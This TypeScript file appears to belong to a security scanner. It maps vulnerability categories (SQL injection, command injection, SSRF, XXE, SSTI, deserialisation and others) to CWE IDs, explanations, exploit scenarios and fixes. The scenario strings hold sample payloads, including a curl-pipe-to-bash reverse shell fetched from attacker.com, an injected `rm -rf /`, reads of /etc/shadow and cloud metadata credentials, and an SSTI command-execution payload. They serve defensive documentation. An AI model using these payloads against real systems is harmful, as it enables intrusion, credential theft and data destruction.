/**
 * Per-category metadata: CWE, plain-language description, exploit scenario,
 * and recommended fix. Used to enrich finding detail panels.
 */

export interface CategoryMeta {
  cwe: string
  title: string
  description: string
  exploitScenario: string
  recommendedFix: string
}

const META: Record<string, CategoryMeta> = {
  sql_query: {
    cwe: 'CWE-89',
    title: 'SQL Injection',
    description:
      'User-controlled input flows into a SQL query without sanitisation. An attacker can manipulate the query structure to read, modify or delete arbitrary database records, bypass authentication, or execute stored procedures.',
    exploitScenario:
      '1. Attacker supplies a crafted value such as `\' OR 1=1 --` in a form field or URL parameter.\n' +
      '2. The value is concatenated directly into a SQL string and executed.\n' +
      '3. The database returns all rows, bypassing intended access controls.\n' +
      '4. With stacked queries enabled, the attacker can DROP tables or exfiltrate data via UNION.',
    recommendedFix:
      'Replace string concatenation with parameterised queries (prepared statements). ' +
      'Never interpolate untrusted values into query strings. ' +
      'Apply an allowlist for column names or table names that must be dynamic. ' +
      'Use an ORM with built-in parameterisation (e.g. SQLAlchemy, Entity Framework).',
  },
  code_exec: {
    cwe: 'CWE-78',
    title: 'OS Command Injection / Code Execution',
    description:
      'User-controlled data reaches an OS command execution function (eval, exec, subprocess, Process.Start, etc.) without sanitisation. An attacker can execute arbitrary commands on the server with the process\'s privileges.',
    exploitScenario:
      '1. Attacker supplies `; curl https://attacker.com/shell.sh | bash` as a parameter.\n' +
      '2. The application concatenates this into a shell command and passes it to exec().\n' +
      '3. The injected commands run server-side, downloading and executing a reverse shell.\n' +
      '4. Attacker gains interactive access to the server.',
    recommendedFix:
      'Avoid passing user input to shell commands entirely. ' +
      'If unavoidable, use array-form APIs (subprocess.run([...]) in Python, execFile in Node) that never invoke a shell. ' +
      'Validate input against a strict allowlist before use. ' +
      'Run the process under a least-privilege account.',
  },
  os_command: {
    cwe: 'CWE-78',
    title: 'OS Command Injection',
    description:
      'User input is passed to a shell command without escaping. An attacker can append shell metacharacters to execute arbitrary commands.',
    exploitScenario:
      '1. Attacker sends `filename; rm -rf /` as a file name input.\n' +
      '2. The application builds `ls {input}` and passes it to the shell.\n' +
      '3. The shell executes both `ls filename` and `rm -rf /`.',
    recommendedFix:
      'Use array-form command execution APIs that bypass the shell. Validate and sanitise all inputs. Never use string interpolation to construct shell commands.',
  },
  path_traversal_candidate: {
    cwe: 'CWE-22',
    title: 'Path Traversal',
    description:
      'User-controlled input is used to construct a file-system path without canonicalisation. An attacker can supply sequences like `../../etc/passwd` to read or write files outside the intended directory.',
    exploitScenario:
      '1. Attacker sends `filename=../../etc/shadow` in a request.\n' +
      '2. The server joins the base directory with the input and opens the resulting path.\n' +
      '3. The attacker reads the shadow password file, obtaining password hashes.',
    recommendedFix:
      'Resolve the full canonical path (`Path.resolve`, `realpath`) and verify it starts with the expected base directory. ' +
      'Reject inputs containing `..`, null bytes, or URL-encoded equivalents. ' +
      'Serve files from a content-addressed store rather than user-supplied names.',
  },
  ssrf_candidate: {
    cwe: 'CWE-918',
    title: 'Server-Side Request Forgery (SSRF)',
    description:
      'User-controlled input is used as the target URL of a server-side HTTP request. An attacker can redirect the request to internal services, cloud metadata endpoints, or private network hosts.',
    exploitScenario:
      '1. Attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the URL.\n' +
      '2. The server fetches this URL from inside the cloud environment.\n' +
      '3. Temporary AWS/GCP credentials are returned to the attacker.',
    recommendedFix:
      'Validate URLs against an allowlist of permitted hosts and schemes. ' +
      'Resolve DNS before making the request and reject private/loopback/link-local addresses. ' +
      'Disable unnecessary URL schemes (file://, gopher://, dict://). ' +
      'Use a dedicated egress proxy that enforces network policy.',
  },
  open_redirect_candidate: {
    cwe: 'CWE-601',
    title: 'Open Redirect',
    description:
      'User-controlled input is used as a redirect destination without validation. An attacker can craft a link that redirects victims to a malicious site after passing through a trusted domain.',
    exploitScenario:
      '1. Attacker sends victims a link: `https://trusted.com/redirect?url=https://phishing.com`.\n' +
      '2. The application redirects the browser to the attacker-controlled URL.\n' +
      '3. Victim lands on a convincing phishing page, trusting it because the original link appeared legitimate.',
    recommendedFix:
      'Maintain an allowlist of permitted redirect targets. ' +
      'If dynamic redirects are needed, use an opaque token mapped server-side to the real URL. ' +
      'Never use raw user input as a redirect URL.',
  },
  xxe_candidate: {
    cwe: 'CWE-611',
    title: 'XML External Entity (XXE)',
    description:
      'An XML parser processes user-supplied XML with external entity resolution enabled. An attacker can exfiltrate local files, perform SSRF, or cause denial of service.',
    exploitScenario:
      '1. Attacker submits an XML document declaring `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.\n' +
      '2. The parser resolves the entity and substitutes the file contents.\n' +
      '3. The file contents appear in the application\'s response.',
    recommendedFix:
      'Disable DTD processing and external entity resolution on the XML parser. ' +
      'In Java: set `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES` to false. ' +
      'In Python: use `defusedxml`. ' +
      'Prefer JSON over XML where possible.',
  },
  template_injection: {
    cwe: 'CWE-94',
    title: 'Server-Side Template Injection (SSTI)',
    description:
      'User input is rendered inside a server-side template without escaping. An attacker can inject template directives to read server variables, execute code, or achieve full remote code execution.',
    exploitScenario:
      '1. Attacker enters `{{7*7}}` into a name field.\n' +
      '2. The template engine evaluates the expression and renders `49`.\n' +
      '3. Attacker escalates to `{{config.__class__.__init__.__globals__["os"].popen("id").read()}}` to run arbitrary commands.',
    recommendedFix:
      'Never pass raw user input to a template rendering function. ' +
      'Use the template engine\'s auto-escaping features. ' +
      'Sandbox the template environment to remove access to built-ins and module globals.',
  },
  unsafe_deser: {
    cwe: 'CWE-502',
    title: 'Unsafe Deserialisation',
    description:
      'User-controlled data is deserialised using an unsafe function (pickle, yaml.load, ObjectInputStream, etc.). An attacker can craft a payload that executes arbitrary code during deserialisation.',
    exploitScenario:
      '1. Attacker sends a crafted serialised object containing a malicious `__reduce__` method.\n' +
      '2. The server deserialises the object, triggering the method.\n' +
      '3. Arbitrary code executes with the server process\'s privileges.',
    recommendedFix:
      'Never deserialise untrusted data with unsafe functions. ' +
      'Use safe alternatives: `json.loads` instead of `pickle.loads`, `yaml.safe_load` instead of `yaml.load`. ' +
      'If deserialisation is required, use a signed/encrypted envelope and validate the signature before deserialising.',
  },
  file_access: {
    cwe: 'CWE-73',
    title: 'External Control of File Name or Path',
    description:
      'User-controlled input influences a file system operation (open, read, write, delete). Without proper validation this can lead to unauthorised file access or modification.',
    exploitScenario:
      '1. Attacker supplies a file name that resolves outside the intended directory.\n' +
      '2. The application opens the file and returns its contents.\n' +
      '3. Sensitive configuration or key material is exposed.',
    recommendedFix:
      'Canonicalise the path and assert it falls within the allowed base directory. ' +
      'Use a fixed set of allowed filenames where possible. ' +
      'Run with minimal filesystem permissions.',
  },
  reflection: {
    cwe: 'CWE-470',
    title: 'Unsafe Reflection',
    description:
      'User input is used to dynamically load a class or invoke a method via reflection. An attacker can instantiate unintended classes, potentially leading to code execution.',
    exploitScenario:
      '1. Attacker supplies a class name pointing to a gadget class (e.g. a class with a malicious static initialiser).\n' +
      '2. The application loads and instantiates the class.\n' +
      '3. The gadget\'s constructor or static block executes attacker-controlled code.',
    recommendedFix:
      'Validate dynamic class names against a strict allowlist. ' +
      'Avoid user-controlled reflection entirely; prefer a registry/factory pattern with hardcoded mappings.',
  },
}

const DEFAULT_META: CategoryMeta = {
  cwe: 'CWE-20',
  title: 'Input Validation Issue',
  description:
    'User-controlled input reaches a sensitive operation without sufficient validation or sanitisation.',
  exploitScenario:
    '1. Attacker supplies a malicious payload in a user-controlled field.\n' +
    '2. The input is processed without validation.\n' +
    '3. The application behaves unexpectedly, potentially exposing data or functionality.',
  recommendedFix:
    'Validate and sanitise all user-controlled input before use. ' +
    'Apply the principle of least privilege and defence in depth.',
}

export function getCategoryMeta(category: string): CategoryMeta {
  return META[category] ?? DEFAULT_META
}
